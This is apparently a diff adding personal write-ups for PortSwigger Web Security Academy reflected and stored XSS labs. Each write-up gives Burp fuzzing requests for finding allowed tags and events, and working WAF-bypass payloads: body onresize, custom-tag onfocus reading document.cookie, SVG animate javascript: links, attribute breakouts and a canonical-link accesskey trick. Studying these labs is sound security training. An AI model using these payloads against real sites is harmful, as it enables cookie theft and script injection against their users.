@@ -203,3 +203,159 @@ JS added \ before /. So we can not use this payload. Try another one.
 ```
 
 > In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets.
+
+### Lab: Reflected XSS into HTML context with most tags and attributes blocked
+
+This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
+
+There is a WAF. It blocks most of tags and attributes.
+
+**XSS tags list ->** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet **-> Copy tags to clipboard**
+
+**Sniper attack with xss tags list -> **
+
+`GET /?search=<§§> HTTP/1.1`
+
+Just body tag is allowed.
+
+**XSS events list -> Choose body tag ->** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet **-> Copy events to clipboard**
+
+**Sniper attack with xss events list -> **
+
+`GET /?search=<body%20§§=1> HTTP/1.1`
+
+Just onresize attribute is allowed.
+
+```
+<body onresize="print()">
+```
+
+**Exploit Server ->**
+
+```
+Body: 
+    <iframe src="https://ac991f1b1edf2073c08b13cd00140027.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+
+Deliver exploit to victim -> Solved.
+
+### Lab: Reflected XSS into HTML context with all tags blocked except custom ones
+
+This lab blocks all HTML tags except custom ones.
+
+```
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+```
+
+**Exploit Server ->**
+
+```
+Body: 
+    <iframe src="https://ac9e1fe91fb69acfc08b2cf400330037.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x" onload=this.style.width='100px'>
+
+OR
+
+    <script>
+    location = 'https://ac9e1fe91fb69acfc08b2cf400330037.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+    </script>
+```
+
+### Lab: Reflected XSS with event handlers and href attributes blocked
+
+This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.
+
+**Sniper attack with xss tags list -> **
+
+`GET /?search=<§§> HTTP/1.1`
+
+_a, animate, image, svg, title_
+
+```
+<svg>
+	<a>
+		<animate attributeName=href values=javascript:alert(1) />
+		<text x=20 y=20>Click me</text>
+	</a>
+	
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+```
+
+### Lab: Reflected XSS with some SVG markup allowed
+
+This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
+
+**Sniper attack with xss tags list -> **
+
+`GET /?search=<§§> HTTP/1.1`
+
+_animatetransform, image, svg, title_
+
+```
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+```
+
+### Lab: Reflected XSS into attribute with angle brackets HTML-encoded
+
+This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded.
+
+```
+/?search=test
+
+In response:
+<input type=text placeholder='Search the blog...' name=search value="test">
+```
+
+```
+"><script>alert(1)</script>
+
+In response:
+<input type=text placeholder='Search the blog...' name=search value=""&gt;&lt;script&gt;alert(1)&lt;/script&gt;">
+```
+
+```
+" autofocus onfocus=alert(1) x="
+OR
+"onmouseover="alert(1)
+```
+
+### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+This lab contains a stored cross-site scripting vulnerability in the comment functionality.
+
+```
+POST /post/comment HTTP/1.1
+...
+csrf=5W6i2nTpsEcdB99eWpnMALhpOtFoC8qF&postId=6&comment=test1&name=test2&email=test3%40test.com&website=https%3A%2F%2Fwww.test4.com
+
+In response:
+<a id="author" href="https://www.test4.com">test2</a>
+```
+
+```
+POST /post/comment HTTP/1.1
+...
+...website=javascript%3Aalert%280%29
+
+In response:
+<a id="author" href="javascript:alert(document)">test</a>
+```
+
+### Lab: Reflected XSS in canonical link tag
+
+This lab reflects user input in a canonical link tag and escapes angle brackets.
+
+```
+<link rel="canonical" href='https://acbb1f671fa57b23c0110b0100ea000f.web-security-academy.net/'/>
+```
+
+```
+Request:
+/?%27test%27=%27test2%27
+
+Response:
+....net/?'test'='test2''/>
+```
+
+```
+/?'accesskey='x'onclick='alert(1)
+```
